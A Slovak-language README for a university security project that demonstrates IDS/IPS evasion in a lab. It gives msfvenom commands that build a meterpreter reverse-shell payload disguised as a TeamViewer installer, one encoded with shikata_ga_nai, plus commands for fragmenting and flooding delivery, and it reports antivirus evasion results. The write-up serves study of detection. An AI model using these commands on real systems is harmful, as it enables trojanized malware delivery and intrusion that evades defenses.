# BIT - IDS/IPS evasion techniques

Obsahom github repozitára je praktická realizácia IDS/IPS obfuskačných techník, ktorá je súčasťou semestrálneho projektu v rámci predmetu Bezpečnosť informačných technológií.

<br>

Venovali sme obfuskačným technikám, kedy sme prenášali škodlivý súbor cez sieť a následne sme pomocou nástroja Wireshark zachytili sieťovú komunikáciu. Vygenerované súbory (.pcap) sme ďalej analyzovali prostredníctvom nástroja Brim. 

<br>

* [No Encoding (.pcap)](/assets/pcaps/No_Encoding.pcap)

* [Shikata ga nai (.pcap)](/assets/pcaps/Shikata_ga_nai.pcap)

* [Fragmentation (.pcap)](/assets/pcaps/Fragmentation.pcap)

* [Flooding (.pcap)](/assets/pcaps/Flooding.pcap)

<br>

Príkazom ``msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=10.10.14.5 LPORT=8080 -f exe -o TeamViewerInstall.exe`` sme vytvorili škodlivý súbor, ktorého účelom je spustenie reverse shellu. Jednoduchý útočný scénar môže predstavovať používateľa, ktorý si chce stiahnuť aplikáciu Team Viewer, kedy ako útočník mu vieme poskytnuť škodlivý spustiteľný kód, ktorý vráti reverse shell. Škodlivý súbor nebol enkódovaný, preto môžeme vidieť v nástroji Brim(viď obrázok Fig.1) identifikáciu spustiteľného súboru v zázname pe.log( https://docs.zeek.org/en/master/logs/index.html) (WINDOWS 95 or NT 4.0 WINDOWS\_GUI), kedy ako sieťový administrátor môžeme ďalej preverovať komunikáciu a následne zabraniť spusteniu kódu. Tiež sme mohli identifikovať alert pre Python SIMPLEHTTP, ale v tomto prípade sme chceli simulovať práve prenos škodlivého súboru, preto môžeme vygenerované upozornenie ignorovať.

<br>

![No Encoding](/assets/img/fig1_no_encoding.png)
|:--:|
| <b>Fig.1 - Identifikácia spustiteľného súboru v nástroji Brim</b>|

<br>

Príkazom ``msfvenom windows/x86/meterpreter\_reverse\_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer\_Setup.exe -e x86/shikata\_ga\_nai -a x86 --platform windows -o TeamViewer\_Setup.exe -i 5`` sme vytvorili škodlivý súbor, ktorého účelom je spustenie reverse shellu. Škodlivý kód je šifrovaný metódou shikata ga nai, ktorý má efektívne zabrániť odhalenie škodlivej činnosti. Následne sme príkazom ``python3 -m http.server`` spustili http server. Príkazom ``wget 192.168.100.153:8000/Team\_Viewer\_Setup.exe`` sme následne súbor stiahli. Komunikáciu sme zachytili pomocou nástroja Wireshark, kedy sme prenos uložili do .pcap súboru. Pcap súbor sme následne vložili do nástroja Brim pre dôkladnejšiu analýzu spojenia. Na obrázku Fig.2 sme mohli evidovať, že nástroj nebol schopný identifikovať spustiteľný kód, kedy ako sieťový administrátor nemáme vedomosť o škodlivej aktivite. Ako útočník sme úspešne obišli IDS/IPS a môžeme vykonávať zlomyseľnú činnosť.

<br>

![Shikata ga nai](/assets/img/fig2_shikata_ga_nai.png)
|:--:|
| <b>Fig.2 - Analýza komunikácie v nástroji Brim (shikata ga nai)</b>|

<br>

Taktiež sme mohli evidovať, že vo väčšine prípadov nebol súbor identifikovaný antivírusovými softvérmi (viď obrázok Fig.3).

<br>

![VirusTotal Shikata ga nai](/assets/img/fig3_virustotal_shikata_ga_nai.png)
|:--:|
| <b>Fig.3 - VirusTotal pre škodlivý súbor enkódovaný shikata ga nai</b>|

<br>

Súbor, ktorý nebol enkódovaný mal vyššiu úspešnosť detekcie antivírusovými softvérmi (viď obrázok Fig.4).

<br>

![VirusTotal No Encoding](/assets/img/fig4_virustotal_no_encoding.png)
|:--:|
| <b>Fig.4 - VirusTotal pre škodlivý súbor bez enkódovania</b>|

<br>

Príkazom ``split --verbose -b1K TeamViewerInstall.exe`` sme rozdelili škodlivý súbor na viacero menších súborov. Ďalej sme príkazom ``python3 -m http.server`` spustili http server.
Príkazom ``for i in {a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z}; do wget 192.168.100.153:8000/xa\$i;done`` a ďaľšou modifikáciou príkazu sme stiahli zo serveru všetky súbory, ktoré nám príkaz ``split`` vygeneroval. Na obrázku Fig.5 možme pozorovať zachytenú komunikáciu pomocou Wireshark a následna vizualizácia IDS logov v nástroji Brim. Týmto spôsobom sme chceli simulovať fragmentáciu súboru, kedy posielame súbor vo fragmentoch, aby systémy detekcie prienikov nedokázali identifikovať podpisy škodlivých súborov. Napriek posielaniu súboru vo fragmentoch bol súbor identifikovaný ako spustiteľný. Mojim presvedčením je, že ak budeme posielať súbor ešte v menších fragmentoch, nebudú IDS nástroje schopné identifikovať podpis. Žiaľ sa mi nepodarilo simulovať prenos v menších fragmentoch.

<br>

![Fragmentation](/assets/img/fig5_fragment.png)
|:--:|
| <b>Fig.5 - Simulácia fragmentácie a analýza komunikácie v Brim</b>|

<br>

Príkazom ``cat `ls` > vsetko.exe`` sme následne poskladali fragmenty súboru spätne na pôvodný súbor. Ďalej pomocou ``md5sum vsetko.exe`` a ``md5sum TeamViewerInstall.exe`` sme overili a porovnali zhodu pôvedného súboru so súborom, ktorý bol spätne poskladaný (viď obrázok Fig.6).

<br>

![Reassemble](/assets/img/fig6_reassemble.png)
|:--:|
| <b>Fig.6 - Znovuzloženie a overenie zhody s pôvodným súborom</b>|

<br>

Príkazom ``while :; do wget 192.168.100.153:8000/TeamViewerInstall.exe;done``
sme sa snažili vyčerpať zdroje zahltením siete hlukom. Ďalej sme príkazom ``wget 192.168.100.153:8000/TeamViewer\_Setup.exe`` podstrčili škodlivý súbor. Chceli sme simulovať metódu flooding, kedy generujeme veľke množstvo sieťovej premávky, tak aby sme zahltili zdroje a následne podstrčili škodlivý súbor bez detekcie. Naša simulácia je ukážka ako metódu možno použiť, pre potreby zahltenia výpočtového výkonu je potrebné generovať väčšie množstvo sieťovej premávky. Na obrázku Fig.7 vieme pozorovať zachytenu komunikáciu s veľkým množstvom upozornení a detekciu spustiteľného kódu. 

<br>

![Flooding](/assets/img/fig7_flooding.png)
|:--:|
| <b>Fig.7 - Simulácia metódy Flooding</b>|

<br>

